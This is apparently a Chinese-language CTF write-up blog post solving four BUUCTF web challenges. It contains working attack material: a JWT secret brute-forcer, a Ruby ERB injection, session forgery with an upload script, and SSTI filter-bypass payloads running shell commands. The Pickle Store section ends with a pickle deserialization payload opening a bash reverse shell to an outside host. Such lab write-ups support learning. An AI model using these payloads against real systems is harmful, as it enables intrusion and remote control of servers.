[buuctf] web区 write up 4
===

这一节开始慢慢上难度了;

## [SCTF2019]Flag Shop

### 代码审计

开门见审计

```php
<script>
    function buyFlag() {
        fetch("/shop", {
            method: 'POST', // or 'PUT'
            headers: new Headers({
                'Content-Type': 'application/x-www-form-urlencoded'
            })
        })
            .then(res => res.text())

            .then(function (response) {
                    alert(response)
                })

            .catch(error =>alert(error))
    }
    function reset() {
        if(confirm("This will reset all Jinkelas , Are U Sure?")){
            fetch("/api/auth");
            setTimeout(()=>window.location.reload(),500);
        }
    }
    function work() {
        fetch("/work?name=bot&do=bot is working")
            .then(()=>window.location.reload());
    }

    fetch("/api/info",{
            redirect: 'manual'
        })
        .then(function (res) {

          if(res.ok){
              return res.json()
          }
          else{
              fetch("/api/auth")
              reject;
          }
        })
        .then(res=>{
            var info = res;
            console.log(info);
            document.getElementById("uid").innerText = info.uid;
            document.getElementById("jkl").innerText = info.jkl;
        })
        .catch(error => setTimeout(()=>window.location.reload(),500))
```

- `/api/info` 目录下会返回一个记录当前账户信息的 json:

![18-1.png](18-1.png)

- `/shop` 界面是商店:

![18-2.png](18-2.png)

- 点击这个 `reset` 会重置身份认证, 服务器会返回一个长得非常像 JWT 的 `set-cookie` 回来, 之后客户端的购买请求都会带上这个 cookie:

![18-3.png](18-3.png)

![18-4.png](18-4.png)

- 点击这个 `work` 会去上班 ~(恼)~ , 过了一会再看一下 cookie, 解码之后会发现多了 4 块钱,   


![18-5.png](18-5.png)

```
# work 前
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjIwfQ.RCmTBqkwkB-vO4-LXtrol0nrAusbJM_cQlT64sYRBBk

# work 后
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjI0fQ.RZsiu--0yV1EcwLjMT5_9ukkES8GK7Li4wqyWkFp0_c
```

### 已知明文攻击 (known plaintext attack)

这种三段全部 base64 编码的算法很容易想到 JWT, JWT 的算法是根据前两段信息, 再加上一个用户的私钥, 算得第三段信息(摘要), 并且 urlsafe_base64 编码, 这样就可以尝试爆破私钥:

```
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjIwfQ.RCmTBqkwkB-vO4-LXtrol0nrAusbJM_cQlT64sYRBBk

eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjI0fQ.RZsiu--0yV1EcwLjMT5_9ukkES8GK7Li4wqyWkFp0_c

eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjI1fQ.XXbklO9XsoxGweFaJ3Uw6b2afBDfmuLPiAAqxC57BwA

eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjMwfQ._ajFYagu6usHxCtjRAAST-u4eHx1OAlHyOZ3TrpN3bw
```

多按几次 `work`, 可以发现每次工作获得的 `jkl` 值是浮动的, 甚至可能为 0 , 且当获得的 `jkl` 为 0 时, cookie 没有发生变化, 说明 cookie 和时间戳无关, 用户私钥可能是唯一变量;

尝试写了一个弱秘钥爆破:

{% hideToggle 爆破脚本 %}

```python
import base64
import hmac
import hashlib
import itertools
import string
import threading

# ------------------------配置------------------------
charset = string.ascii_letters + string.digits  # [a-zA-Z0-9]
min_len = 4
max_len = 8   # 注意：先别跑太大，先试 4~8 位
thread_num = 16

# 目标 JWT
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI0MThmZTRmOC1lMDQ3LTQwMzEtOTg4Ny0xYWUxYzk2YmRiN2YiLCJqa2wiOjMwfQ._ajFYagu6usHxCtjRAAST-u4eHx1OAlHyOZ3TrpN3bw"
header_payload, target_signature = ".".join(
    token.split(".")[:2]), token.split(".")[2]

found = threading.Event()
print_lock = threading.Lock()

# ------------------------工具函数------------------------


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')


def print_status(msg):
    with print_lock:
        print(f"[*] Trying: {msg}")


def verify_signature(secret: str) -> bool:
    digest = hmac.new(secret.encode(), header_payload.encode(),
                      hashlib.sha256).digest()
    signature = b64url_encode(digest)
    return signature == target_signature

# ------------------------生成器共享------------------------


def key_generator():
    for l in range(min_len, max_len + 1):
        for comb in itertools.product(charset, repeat=l):
            yield ''.join(comb)


gen = key_generator()
gen_lock = threading.Lock()

# ------------------------爆破线程------------------------


def worker():
    while not found.is_set():
        with gen_lock:
            try:
                key = next(gen)
            except StopIteration:
                return

        print_status(key)
        if verify_signature(key):
            with print_lock:
                print(f"[+] Secret key found: {key}")
            found.set()
            return

# ------------------------主函数------------------------


def main():
    print("[*] Starting brute-force...")
    threads = []
    for _ in range(thread_num):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found.is_set():
        print("[-] Secret key not found.")


if __name__ == '__main__':
    main()
```

{% endhideToggle %}

运行了一下速度不太理想, 之后又尝试了一下字典组合, 替换一下 `JinKela` 这个单词, 发现也不对, 可能这里不存在弱密钥。搜索了一下发现原来 HS256 这种算法是能对抗已知明文攻击/已知密文攻击的, 知道多个组合也不能加速, 那又回到原点了, 看看有没有其他信息泄露

### 信息泄露

看了一眼 WP, 回到根目录尝试访问 `robots.txt`, 居然有显示, 发现了隐藏的目录:

![18-6.png](18-6.png)

> 说明不管题目多恶心, 就算对目录爆破有严格限速也还是值得扫的, 长教训了。

访问这个目录, 是备份源码:

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

> 怪不得爆破不出来 secret, 原来是 `SecureRandom.hex(64)` 生成的

### Ruby ERB 注入

注意这一段:

```ruby
unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end
```

这一段中如果 secret 匹配正确就会输出 flag, 而 Ruby 中有全局变量 **`$POSTMATCH`, 表示上个匹配的变量**; 

直接构造 payload 就可以把 secret 读出来:

```
/work?SECRET=&name=<%=$'%>&do=<%=$'%> is working

编码后:
/work?SECRET=&name=%3c%25%3d%24%27%25%3e&do=%3c%25%3d%24%27%25%3e%20is%20working
```

![18-7.png](18-7.png)

得到了秘钥, 那么 JWT 也就被破解可以任意编辑了:

![18-8.png](18-8.png)

接下来发起购买流程, 抓包改 cookie:

![18-9.png](18-9.png)

![18-10.png](18-10.png)

显示成功, 但是没有flag, 追踪一下包:

![18-11.png](18-11.png)

这串特别长的 set-cookie 比较可疑:

![18-12.png](18-12.png)

解码即拿到 flag: `flag{dd9a62f1-50c1-4509-8010-fa865bcfe46a}`

## [HFCTF2020] BabyUpload

### 代码审计

典中典之开门见审计:

```php
<?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```

审计完毕之后代码逻辑大概如下: 首先指定了 session 存放路径, 根据 session 中的 username 指定工作目录, 如果 session 是 admin 的, 还会删除一个 `success.txt`;

之后可以选上传和下载:

- 上传: 参数 `$direction` 为 "upload", 可选参数 `$attr` 用于指定存放目录是否为 session 当前的私人目录, 具体存储过程为: 存放一个 sha256 后的文件 `up_file` (其中这一步做了防路径穿越的正则过滤); 之后把这个文件移动到刚刚指定的目录中, 权限为 0700;
- 下载: 参数 `$direction` 为 "download", `$filename` 为要下载的文件名, 会下载 `/var/babyctf/` 下的对应文件(如果存在); 

需要注意的是, 自定义的上传文件的真实文件名的结构为: `原名 + '_' + sha256(原名)(64位)`, 增加了 65 位的后缀, 所以下载的时候实际上会在请求头中删去这65位结果。

分析一下, 应该是只要: 

1. 把 `success.txt` 传到 `/var/babyctf` 下, 
2. 用 admin 的 session 访问当前页面就可以得到 flag;

### 获取 session

在这里卡住了, 查了下资料和 wp, 注意到默认上传目录和 session 的工作目录是同一个, 考虑直接下载 session 文件;

**PHP 中 session 的默认名为 `sess_` + PHPSESSID 的值**, 抓个包看看:

![19-1.png](19-1.png)

构造payload:

```
direction=download&attr=&filename=sess_0135183815e828dc4b4c89d1a14494d3
```

拿到回显:

![19-2.png](19-2.png)

这里有个坑: `usernames:5:"guest";` 前面应该还有个不可见字符; 

> php_binary: 存储方式是，键名的长度对应的 ASCII 字符 + 键名 + 经过`serialize()`函数序列化处理的值
>php: 存储方式是，键名 + 竖线 + 经过 `serialize()`函数序列处理的值
>php_serialize (php>5.5.4): 存储方式是，经过 `serialize()` 函数序列化处理的值

> 参考: [PHP session 反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)

![19-3.png](19-3.png)

从 BP 复制过来验证一下发现这个不可见字符是 `%08`, 考虑到下标很可能是 0 开始这里 `%08` 其实是九个字符, 正好和键名 "username" 可以对上; **这说明 ession 处理器为 php_binary**;

### 伪造 session

一旦知道了 session 处理器, 就可以伪造 session 了:

```php
<?php
ini_set('session.serialize_handler', 'php_binary');
session_save_path("C:\\Users\\Xi\\Desktop\\1 (2)");
session_start();

$_SESSION['username'] = 'admin';
```

运行得到一个 session: `sess_io76nulh1dksv6bjp95bsjns32`, 打开可以验证:

之后把这个 session 改名为 `sess` 并计算 SHA256, 注意这里的方式和题中的源码是一致的, 方便上传之后不走丢:

```bash
php -r "echo hash_file('sha256','sess');" 
```

![19-4.png](19-4.png)

得到期望文件名: `sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`

### 上传 session

```python
#!/usr/bin/env python3
# exploit.py

import requests


def main():
    url = 'http://d2743252-1698-4694-bb65-5c34d52e5ef8.node5.buuoj.cn:81/'
    # 设置 PHPSESSID
    cookies = {
        'PHPSESSID': '0135183815e828dc4b4c89d1a14494d3'
    }
    # 普通表单字段
    data = {
        'direction': 'upload',
        'attr': ''
    }
    # 文件字段
    files = {
        'up_file': ('sess', open('sess', 'rb'))
    }

    resp = requests.post(url, cookies=cookies, data=data, files=files)
    print(f'[+] HTTP {resp.status_code}\n')
    print(resp.text)


if __name__ == '__main__':
    main()
```

构造刚刚预期的名字来验证:

```
direction=download&attr=&filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

![19-5.png](19-5.png)

最后是这个 `success.txt`, 常规上传文件肯定是行不通的, 因为服务器会给这个文件加一长串哈希后缀, 而这里用的是强匹配。

注意到源码中使用的是 `file_exist()` 函数, 这个函数是匹配**文件和目录**的, 那么创建一个目录就行了:

在刚刚的上传 python 脚本中把 `attr` 改为 `success.txt` 即可;

最后将 cookie 中的 session 转换为刚刚上传 session 的 SHA256 值, php 会自动与 `/var/babyctf` 下伪造的 session 对比, 然后通过, 再读到 `/success.txt` 文件夹, 然后输出 flag:

![19-6.png](19-6.png)

得到 flag{260bdbf4-0b67-4da5-9817-39f0b645f12f}。

## [GWCTF 2019]你的名字

### 题解

进来尝试 XSS, SQL 均无果, 试试 SSTI 注入, 报错了, 不过 `{{}}` 报错, 但是 `{%%}` 似乎没事, 考虑过滤了双括号, 用 `{%print()%}` 把结果带出来:

经过尝试发现可能有很多关键词过滤, 用字符串拼接绕过一下:

```python
name={%print(''['__cla''ss__']['__m''ro__'][2]['__subc''lasses__']())%}
```

![20-1.png](20-1.png)

发现 file 类正是下标 40, 说明环境为 python 2, 尝试读任意文件:

```python
name={%print(''['__cla''ss__']['__m''ro__'][2]['__subc''lasses__']()[40]('/etc/passwd').read())%}
```

![20-2.png](20-2.png)

成功了, 不过读 `/flag` (拼接后)返回了500, 可能没有这个结构, 那就要考虑执行更复杂的指令来找位置;

下一步就是要找一个含有执行任意指令的内建函数的类, 例如 `warnings.catch_warnings`, 这里写了个 python 脚本:

{% hideToggle 查找vuln class %}

```python
import requests
import time

URL = 'http://ccd7320a-db75-4426-951a-f8fd0a200e29.node5.buuoj.cn:81/'
TIMEOUT = 5  # 请求超时（秒）
RATE_LIMIT = 5  # 每秒最多请求数
DELAY = 1.0 / RATE_LIMIT  # 请求间隔（秒）


def try_index(idx):
    # 构造 payload
    payload = "{%print(''['__cla''ss__']['__m''ro__'][2]['__subc''lasses__']()[" + str(idx) + "])%}"
    data = {'name': payload}
    try:
        resp = requests.post(URL, data=data, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[{idx}] 请求失败: {e}")
        return False, None
    text = resp.text or ''
    found = resp.status_code == 200 and 'catch_warnings' in text
    return found, text


def main():
    for i in range(201):
        found, text = try_index(i)
        print(f"[{i}] 检测 -> {'FOUND' if found else 'not found'}")
        if found:
            print(">>> 成功检测到 catch_warnings！")
            print(f">>> Payload 索引: {i}")
            break
        # 限速：每秒最多发送 RATE_LIMIT 个请求
        #print(">>> 响应内容片段：")
        #print(text[:500])
        time.sleep(DELAY)
    else:
        print("在 0–200 范围内未检测到 catch_warnings。")


if __name__ == '__main__':
    main()
```

{% endhideToggle %}

![20-3.png](20-3.png)

接下来构造 payload, 尽量拼好所有关键字来尝试执行命令:

```payload
name={%print(''['__cla''ss__']['__m''ro__'][2]['__subc''lasses__']()[59]['__in''it__']['__glo''bals__']['__bu''iltins__']['ev''al']('__imp''ort__("o''s").po''pen("ls /").read()'))%}
```

![20-4.png](20-4.png)

到这里已经基本拿下了; 最终 payload:

```payload
name={%print(''['__cla''ss__']['__m''ro__'][2]['__subc''lasses__']()[59]['__in''it__']['__glo''bals__']['__bu''iltins__']['ev''al']('__imp''ort__("o''s").po''pen("cat /flag_1s_Hera").read()'))%}
```

拿到 `flag{703198a9-25ae-4f4f-8168-c98a6fa5fb14}`

![20-5.png](20-5.png)

## [watevrCTF-2019]Pickle Store

### 反序列化

打开是一个商店界面, 和以前做过的 [cookie_store](https://r4x.top/2025/07/28/buu_wp2/) 这题非常像:

![21-1.png](21-1.png)

还是老问题, 只有 $500, 但是需要买到 $1000 的 Flag Pickle 才行, 先买个$10 的 standard pickle 的抓包, 可以看到 cookie 里带了一个 base64 的数据, 分析一下:

![21-2.png](21-2.png)

结合题目这一串应该是 序列化再 base64 之后的商品信息, 其特征是:

第一位一定是 `\x80`, 下一位为协议编号, 如这里是 `\x03`, 那就是 3 号协议, 写个简单的 python 文件解码一下:

```python
import base64
import pickle

# Base64 编码的 pickle 数据
b64_data = "gAN9cQAoWAUAAABtb25leXEBTYgTWAcAAABoaXN0b3J5cQJYFQAAAFl1bW15IHN0YW5kYXJkIHBpY2tsZXEDWBAAAABhbnRpX3RhbXBlcl9obWFjcQRYIAAAAGFhMWJhNGRlNTUwNDhjZjIwZTBhN2E2M2I3ZjhlYjYycQV1Lg=="

# 解码
decoded_data = base64.b64decode(b64_data)

# 反序列化
obj = pickle.loads(decoded_data)

# 打印结果
print(obj)
```

得到的结果是

```json
{
    'money': 500,
    'history': [],
    'anti_tamper_hmac': 'aa1b4c3e55048cf93s0a7a63b7f8eb62'
}
```

此时响应包里有一个 set-cookie, 同样解码:

```json
data = {
    'money': 490,
    'history': ['Yummy standard pickle'],
    'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'
}
```

注意到 `'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'`, 这一项是一个签名, 也就是说不能随便改 money 来买商品了, 这里只能寻找其他思路。

这里本身的逻辑应该是反序列化后比对其中的 `'anti_tamper_hmac'` 这一项的签名是否有效, 然后再将 POST 中对应商品 id 与 money 作比较购买, 但是用 pickle 反序列化有一个特性, 由于反序列化对象是可以自定义的, 可以直接定义 `__reduce__` 方法, 在反序列化的时候直接被调用, 可以通过这个方法直接突破比对, 比如植入一个反弹shell:

### 构造反弹 shell

```python
import base64
import pickle

class A(object):
    def __reduce__(self):
        # 反弹 shell 到 frp-gap.com:36667
        cmd = "bash -i >& /dev/tcp/frp-gap.com/36667 0>&1"
        return (eval, ("__import__('os').system(%r)" % cmd,))

a = A()

# 构造 pickle payload 并 base64 编码
payload = base64.b64encode(pickle.dumps(a))

# 输出最终 payload
print(payload.decode())
```

